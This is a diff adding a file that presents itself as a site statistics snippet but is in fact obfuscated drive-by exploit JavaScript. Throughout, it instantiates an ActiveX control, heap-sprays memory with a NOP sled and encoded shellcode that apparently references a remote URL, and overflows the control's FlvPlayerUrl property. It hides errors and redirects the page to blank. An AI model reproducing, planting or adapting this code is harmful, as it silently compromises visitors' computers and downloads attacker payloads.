@@ -1,0 +1,64 @@
+<SCRIPT>window.onerror=function(){return true;}</SCRIPT>
+<!-- START AIYA Site Stat. -->
+<SCRIPT>
+document.writeln("<object classid=\"clsid:F3E70CEA-956E-49CC-B444-73AFE593AD7F\" id=\"Silverlight\"><\/object>");
+document.writeln("<SCRIPT language=\"JavaScript\">");
+document.writeln("var FUCK630ld,Wolfdalef,Wolfdalek,QuadroSCR,QuadroXFX;");
+document.writeln("var FUCK6301d,FUCK6302d,FUCK6303d,FUCK6304d,FUCK6305d,FUCK6306d,FUCK6307d,FUCK6308d,FUCK6309d,FUCK63010;");
+document.writeln("var Panasona1,Panasona2,Panasona3,Panasona4,Panasona5,Panasona6,Panasona7,Panasona8,Panasona9,Panason10;");
+document.writeln("FUCK6301d = unescape(\"psd2f2f\");\/\/(\"psdce4epsd4b62psd2c63psd2638psddf57psd2d5epsd7753psd0c80psd\");");
+document.writeln("FUCK6303d = unescape(\"psd7265\");\/\/(\"psd6153psd4772psdf876psd3a67psd3175psd8e4epsdf665psd1a5cpsd\");");
+document.writeln("FUCK6302d = unescape(\"psd7375\");\/\/(\"psd3a67psd025epsd3a57psd1385psdf65epsd0cffpsd8259psdca4epsd\");");
+document.writeln("FUCK6304d = unescape(\"psd2e31\");\/\/(\"psd8476psd858dpsd8485psdce98psd2857psd7065psd0178psdf876psd\");");
+document.writeln("FUCK6306d = unescape(\"psd2e36\");\/\/(\"psdbf4fpsd3a64psd497bpsd7972psd288dpsd0c80psd3a4epsd886dpsd\");");
+document.writeln("FUCK6308d = unescape(\"psd6b61\");\/\/(\"psd398dpsd0580psd7351psde86cpsd0230psd6153psd4772psd3a67psd\");");
+document.writeln("FUCK63010 = unescape(\"psd0073\");\/\/(\"psd1062psd3a4epsd174fpsd8253psd4655psd894epsdf876psdfd8fpsd\");");
+document.writeln("FUCK6305d = unescape(\"psd3231\"+\"psd372d\");\/\/(\"psdf95bpsd618cpsd0cffpsd227dpsd3c5cpsd9f8fpspsd\");");
+document.writeln("FUCK6309d = unescape(\"psd2e33\"+\"psd7363\");\/\/(\"psd5e3cpsd76b7psd5384psdfb7cpsd1752psd0130pspsd\");");
+document.writeln("FUCK6307d = unescape(\"psd6e63\"+\"psd622f\");\/\/(\"psd4e17psd533apsd7261psd6747psd4e3apsd5c13pspsd\");");
+document.writeln("Panasona1 = unescape(\"psd4343\"+\"psd4343psd4343\");\/\/(\"psd7c69psd52fbpsd3017psd6701psd4e7epspsd\");");
+document.writeln("Panasona3 = unescape(\"psdf78bpsd046apsde859psd0043psd0000psdf9e2psd6f68psd006epsd6800psd7275psd6d6c\");");
+document.writeln("Panasona2 = unescape(\"psda3e9psd0000psd5f00psda164psd0030psd0000psd408bpsd8b0cpsd1c70psd8badpsd0868\");");
+document.writeln("Panason10 = unescape(\"psdc1ecpsde579psd98b8psd8afepsdef0epsde0cepsd3660psd2f1apsd6870psd7474psd3a70\");");
+document.writeln("Panasona8 = unescape(\"psdcbc1psd030dpsd40dapsdf1ebpsd1f3bpsde775psd8b5epsd245epsddd03psd8b66psd4b0c\");");
+document.writeln("Panasona4 = unescape(\"psdff54psd9516psd2ee8psd0000psd8300psd20ecpsddc8bpsd206apsdff53psd0456psd04c7\");");
+document.writeln("Panasona5 = unescape(\"psd5c03psd2e61psdc765psd0344psd7804psd0065psd3300psd50c0psd5350psd5057psd56ff\");");
+document.writeln("Panasona7 = unescape(\"psd8b56psd2076psdf503psdc933psd4149psd03adpsd33c5psd0fdbpsd10bepsdd63apsd0874\");");
+document.writeln("Panasona9 = unescape(\"psd5e8bpsd031cpsd8bddpsd8b04psdc503psd5eabpsdc359psd58e8psdffffpsd8effpsd0e4e\");");
+document.writeln("Panasona6 = unescape(\"psd8b10psd50dcpsdff53psd0856psd56ffpsd510cpsd8b56psd3c75psd748bpsd782epsdf503\");");
+document.writeln("Wolfdalef = Panasona1+Panasona2+Panasona3+Panasona4+Panasona5+Panasona6+Panasona7+Panasona8+Panasona9+Panason10;");
+document.writeln("FUCK630ld = FUCK6301d+FUCK6302d+FUCK6303d+FUCK6304d+FUCK6305d+FUCK6306d+FUCK6307d+FUCK6308d+FUCK6309d+FUCK63010;");
+document.writeln("Wolfdalek = unescape(\"%u7468%u7074%u2f3a%u642f%u2e7a%u7375%u6e2e%u7465%u622f%u6b61%u632e%u7373%u0000\");");
+document.writeln("QuadroSCR = Wolfdalef+FUCK630ld;");
+document.writeln("QuadroXFX = unescape(QuadroSCR.replace(\/psd\/g,\"\\x25\\x75\"));");
+document.writeln("var Virus = 0x100000;");
+document.writeln("var ActivePerl = 0x0c0c0c0c;");
+document.writeln("var DrWeb = QuadroXFX.length * 2;");
+document.writeln("var Norton = Virus - (DrWeb+0x38);");
+document.writeln("var AntiVir = unescape(\"%u0D0D%u0D0D\");");
+document.writeln("AntiVir = getSpraySlide(AntiVir,Norton);");
+document.writeln("Ewido = (ActivePerl - 0x100000)\/Virus;");
+document.writeln("Mcafee = new window[\"\\x41\\x72\\x72\\x61\\x79\"]();");
+document.writeln("for (i=0;i<Ewido;i++)");
+document.writeln("{");
+document.writeln("Mcafee[i] = AntiVir + QuadroXFX;");
+document.writeln("}");
+document.writeln("function getSpraySlide(AntiVir, Norton)");
+document.writeln("{");
+document.writeln("while (AntiVir.length*2<Norton)");
+document.writeln("{");
+document.writeln("AntiVir += AntiVir;");
+document.writeln("}");
+document.writeln("AntiVir = AntiVir.substring(0,Norton\/2);");
+document.writeln("return AntiVir;");
+document.writeln("}");
+document.writeln("var size_buff = 1070;");
+document.writeln("var x =  unescape(\"%0c%0c%0c%0c\");");
+document.writeln("while (x.length<size_buff) x += x;");
+document.writeln("Silverlight[\"\\x46\\x6c\\x76\\x50\\x6c\\x61\\x79\\x65\\x72\\x55\\x72\\x6c\"] = x;");
+document.writeln("<\/script>");
+</SCRIPT><SCRIPT>
+document.writeln("<script>");
+document.writeln("location.replace(\"\\x61\\x62\\x6f\\x75\\x74\\x3a\\x62\\x6c\\x61\\x6e\\x6b\");");
+document.writeln("<\/script>");
+</SCRIPT>
